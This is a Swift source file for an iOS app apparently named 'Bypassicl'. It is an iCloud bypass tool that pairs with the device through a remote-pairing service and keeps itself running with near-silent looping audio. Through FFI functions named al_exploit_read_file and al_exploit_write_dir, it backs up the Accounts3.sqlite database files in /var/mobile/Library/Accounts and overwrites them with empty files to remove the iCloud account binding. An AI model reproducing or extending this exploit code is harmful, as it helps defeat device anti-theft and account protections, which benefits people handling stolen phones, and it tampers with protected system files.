import Foundation
import Combine
import UniformTypeIdentifiers
import Network
import AVFoundation

class AirliftService: ObservableObject {
    static let shared = AirliftService()
    
    @Published var logs: String = "=== Bypassicl Log ===\n"
    @Published var isPairing = false
    @Published var currentPin: String? = nil
    @Published var pairingFilePath: String? = nil
    @Published var lastDeviceName: String? = nil
    
    private var localNetBrowser: NWBrowser?
    private var audioPlayer: AVAudioPlayer?
    private let accountsDir = "/var/mobile/Library/Accounts"
    private let targetFiles = ["Accounts3.sqlite", "Accounts3.sqlite-shm", "Accounts3.sqlite-wal"]
    
    var backupDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("AccountsBackup")
    }
    
    private var documentsDir: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
    }
    
    var hasCompleteBackup: Bool {
        let fm = FileManager.default
        return targetFiles.allSatisfy { file in
            let url = backupDir.appendingPathComponent(file)
            return fm.fileExists(atPath: url.path)
        }
    }
    
    private func log(_ message: String) {
        DispatchQueue.main.async {
            self.logs += message + "\n"
            print(message)
        }
    }
    
    // MARK: - Callbacks
    private static let logCallback: ALLogCallback = { ctx, msg in
        guard let msg = msg, let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        service.log("[Airlift] \(String(cString: msg))")
    }
    
    private static let pinCallback: ALPairPinCb = { pin, ctx in
        guard let pin = pin, let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        let pinStr = String(cString: pin)
        DispatchQueue.main.async {
            service.currentPin = pinStr
            service.log("🔐 PIN: \(pinStr) → Go to Settings → Developer → enter this PIN")
        }
    }
    
    private static let readyCallback: ALPairReadyCb = { ctx, serviceId, port, _, _, _ in
        guard let ctx = ctx else { return }
        let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
        let sid = serviceId != nil ? String(cString: serviceId!) : "?"
        service.log("📡 Host ready: \(sid) : \(port)")
    }
    
    // MARK: - Import Pairing File
    func importPairingFile(from url: URL) {
        let accessing = url.startAccessingSecurityScopedResource()
        defer { if accessing { url.stopAccessingSecurityScopedResource() } }
        
        do {
            try FileManager.default.createDirectory(at: documentsDir, withIntermediateDirectories: true)
            let dest = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing")
            
            var fileData: Data? = try? Data(contentsOf: url)
            if fileData == nil {
                var coordError: NSError?
                NSFileCoordinator().coordinate(readingItemAt: url, options: .withoutChanges, error: &coordError) { newURL in
                    fileData = try? Data(contentsOf: newURL)
                }
            }
            
            guard let data = fileData, !data.isEmpty else {
                log("❌ Could not read data from file: \(url.lastPathComponent)")
                return
            }
            
            try data.write(to: dest, options: .atomic)
            DispatchQueue.main.async {
                self.pairingFilePath = dest.path
                self.log("✅ Pairing file imported successfully (\(data.count) bytes)")
            }
        } catch {
            log("❌ Failed to import pairing file: \(error.localizedDescription)")
        }
    }
    
    // MARK: - Pair on Device
    func startPairingOnDevice() {
        guard !isPairing else { return }
        
        isPairing = true
        currentPin = nil
        log("[*] Starting Pair on Device...")
        log("👉 Grant Local Network permission, open Settings → Privacy & Security → Developer Mode and wait for PIN")
        
        try? FileManager.default.createDirectory(at: documentsDir, withIntermediateDirectories: true)
        let outPath = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing").path
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        
        DispatchQueue.main.async {
            self.startKeepAliveAudio()
            self.triggerLocalNetworkPrompt()
        }
        
        DispatchQueue.global(qos: .userInitiated).async {
            var result = ALPairResult()
            
            let code = al_pairing_run_host(
                "0.0.0.0",
                0,
                "Bypassicl",
                "iPhone",
                outPath,
                nil,
                AirliftService.readyCallback,
                AirliftService.pinCallback,
                ctx,
                &result
            )
            
            defer { al_pairing_result_free(&result) }
            
            DispatchQueue.main.async {
                self.stopPairingServices()
                self.isPairing = false
                self.currentPin = nil
                
                if code == 0 {
                    if let path = result.pairing_file_path {
                        self.pairingFilePath = String(cString: path)
                        self.log("✅ Pairing successful!")
                        self.log("📁 File: \(self.pairingFilePath!)")
                    }
                    if let name = result.device_name {
                        self.lastDeviceName = String(cString: name)
                        self.log("📱 Device: \(self.lastDeviceName!)")
                    }
                } else {
                    let err = result.error != nil ? String(cString: result.error!) : "unknown error"
                    self.log("❌ Pairing failed: \(err)")
                }
            }
        }
    }
    
    private func triggerLocalNetworkPrompt() {
        localNetBrowser?.cancel()
        localNetBrowser = nil
        
        let browser = NWBrowser(
            for: .bonjour(type: "_remotepairing-pairable-host._tcp", domain: "local."),
            using: .tcp
        )
        browser.stateUpdateHandler = { [weak self] state in
            if case .ready = state {
                self?.log("🌐 Local Network ready")
            }
        }
        localNetBrowser = browser
        browser.start(queue: .main)
    }
    
    private func stopPairingServices() {
        localNetBrowser?.cancel()
        localNetBrowser = nil
        stopKeepAliveAudio()
    }
    
    private func startKeepAliveAudio() {
        do {
            let session = AVAudioSession.sharedInstance()
            try session.setCategory(.playback, options: [.mixWithOthers])
            try session.setActive(true)
            
            let sampleRate: UInt32 = 8000
            let numSamples: UInt32 = 8000
            let dataSize = numSamples * 2
            var wav = Data()
            wav.append("RIFF".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: (36 + dataSize).littleEndian) { Data($0) })
            wav.append("WAVEfmt ".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: UInt32(16).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(1).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(1).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: sampleRate.littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: (sampleRate * 2).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(2).littleEndian) { Data($0) })
            wav.append(withUnsafeBytes(of: UInt16(16).littleEndian) { Data($0) })
            wav.append("data".data(using: .ascii)!)
            wav.append(withUnsafeBytes(of: dataSize.littleEndian) { Data($0) })
            wav.append(Data(count: Int(dataSize)))
            
            let player = try AVAudioPlayer(data: wav)
            player.numberOfLoops = -1
            player.volume = 0.01
            player.play()
            audioPlayer = player
        } catch {
            log("⚠️ Keep-alive audio error: \(error.localizedDescription)")
        }
    }
    
    private func stopKeepAliveAudio() {
        audioPlayer?.stop()
        audioPlayer = nil
        try? AVAudioSession.sharedInstance().setActive(false)
    }
    
    func stopPairing() {
        stopPairingServices()
        isPairing = false
        currentPin = nil
        log("⏹ Pairing cancelled")
    }
    
    // MARK: - Connect
    func connect() -> Bool {
        log("[*] Checking pairing...")
        
        if pairingFilePath == nil {
            let candidates = [
                "pairingRecord.mobiledevicepairing",
                "pairingRecord.plist",
                "pairing.plist"
            ]
            for name in candidates {
                let url = documentsDir.appendingPathComponent(name)
                if FileManager.default.fileExists(atPath: url.path) {
                    pairingFilePath = url.path
                    break
                }
            }
        }
        
        guard let path = pairingFilePath, FileManager.default.fileExists(atPath: path) else {
            log("❌ No pairing file found. Please Pair on Device or import a file.")
            return false
        }
        
        log("✅ Using pairing file: \(path)")
        return true
    }
    
    // MARK: - Grappa Token
    private func generateGrappaToken() -> Data? {
        let maxLen = 1024
        var buffer = [UInt8](repeating: 0, count: maxLen)
        var outLen: size_t = 0
        var errBuffer = [CChar](repeating: 0, count: 256)
        
        let result = ALGetGrappaToken(1, 0, 1, &buffer, maxLen, &outLen, &errBuffer, 256)
        if result == 0 {
            return Data(bytes: buffer, count: Int(outLen))
        } else {
            log("Grappa Error (\(result)): \(String(cString: errBuffer))")
            return nil
        }
    }
    
    // MARK: - FFI Helpers
    private func ffi_read_file(_ iosPath: String) -> Data? {
        guard let pairing = pairingFilePath else { return nil }
        
        var outData: UnsafeMutablePointer<UInt8>? = nil
        var outLen: size_t = 0
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        
        let result = al_exploit_read_file(
            pairing,
            iosPath,
            AirliftService.logCallback,
            ctx,
            &outData,
            &outLen,
            &outError
        )
        
        defer {
            if let e = outError { al_string_free(e) }
            if let d = outData { al_bytes_free(d, outLen) }
        }
        
        guard result == 0, let ptr = outData, outLen > 0 else {
            let err = outError != nil ? String(cString: outError!) : "unknown error"
            log("❌ Failed to read \(iosPath): \(err)")
            return nil
        }
        return Data(bytes: ptr, count: Int(outLen))
    }
    
    private func ffi_write_dir(sourceDir: String, targetDir: String) -> Bool {
        guard let pairing = pairingFilePath else { return false }
        
        var outError: UnsafeMutablePointer<CChar>? = nil
        let ctx = Unmanaged.passUnretained(self).toOpaque()
        
        let result = al_exploit_write_dir(
            pairing,
            sourceDir,
            targetDir,
            AirliftService.logCallback,
            ctx,
            &outError
        )
        
        defer { if let e = outError { al_string_free(e) } }
        
        guard result == 0 else {
            let err = outError != nil ? String(cString: outError!) : "unknown error"
            log("❌ Failed to write files: \(err)")
            return false
        }
        
        return true
    }
    
    // MARK: - Auto Backup
    private func autoBackupAccountsIfNeeded() -> Bool {
        if hasCompleteBackup {
            log("ℹ️ Original backup already exists in AccountsBackup, keeping original.")
            return true
        }
        
        log("[*] Auto-backing up 3 Accounts files before Bypass...")
        do {
            try FileManager.default.createDirectory(at: backupDir, withIntermediateDirectories: true)
        } catch {
            log("❌ Could not create backup directory: \(error.localizedDescription)")
            return false
        }
        
        for file in targetFiles {
            let path = "\(accountsDir)/\(file)"
            guard let data = ffi_read_file(path) else {
                log("❌ Auto-backup failed for file: \(file)")
                return false
            }
            do {
                try data.write(to: backupDir.appendingPathComponent(file), options: .atomic)
                log("✅ Backup saved: \(file) (\(data.count) bytes)")
            } catch {
                log("❌ Failed to write backup file \(file): \(error.localizedDescription)")
                return false
            }
        }
        
        log("✅ Auto-backup completed at: \(backupDir.path)")
        return true
    }
    
    // MARK: - Bypass iCloud
    func bypassICloud() {
        log("[*] Starting Bypass...")
        guard autoBackupAccountsIfNeeded() else {
            log("❌ Bypass cancelled — auto-backup failed")
            return
        }
        
        let tmp = FileManager.default.temporaryDirectory.appendingPathComponent("empty_\(UUID().uuidString)")
        do {
            try FileManager.default.createDirectory(at: tmp, withIntermediateDirectories: true)
            for file in targetFiles {
                try Data().write(to: tmp.appendingPathComponent(file), options: .atomic)
            }
        } catch {
            log("❌ Could not create overwrite data: \(error.localizedDescription)")
            return
        }
        
        if ffi_write_dir(sourceDir: tmp.path, targetDir: accountsDir) {
            log("🎉 BYPASS SUCCESSFUL! Reboot your device.")
        } else {
            log("❌ Failed to write files")
        }
        try? FileManager.default.removeItem(at: tmp)
    }
    
    // MARK: - Restore Original Accounts
    func restoreOriginalAccounts() {
        log("[*] Restoring original accounts from backup...")
        
        let fm = FileManager.default
        let stagingDir = FileManager.default.temporaryDirectory.appendingPathComponent("restore_\(UUID().uuidString)")
        
        do {
            try fm.createDirectory(at: stagingDir, withIntermediateDirectories: true)
            for file in targetFiles {
                let backupFileURL = backupDir.appendingPathComponent(file)
                guard fm.fileExists(atPath: backupFileURL.path) else {
                    log("❌ Backup file missing: \(file)")
                    return
                }
                let stagingFileURL = stagingDir.appendingPathComponent(file)
                try fm.copyItem(at: backupFileURL, to: stagingFileURL)
            }
            
            if ffi_write_dir(sourceDir: stagingDir.path, targetDir: accountsDir) {
                log("✅ Successfully restored original accounts! Reboot your device.")
            } else {
                log("❌ Failed to write restored files to device.")
            }
        } catch {
            log("❌ Restore failed: \(error.localizedDescription)")
        }
        
        try? fm.removeItem(at: stagingDir)
    }
}
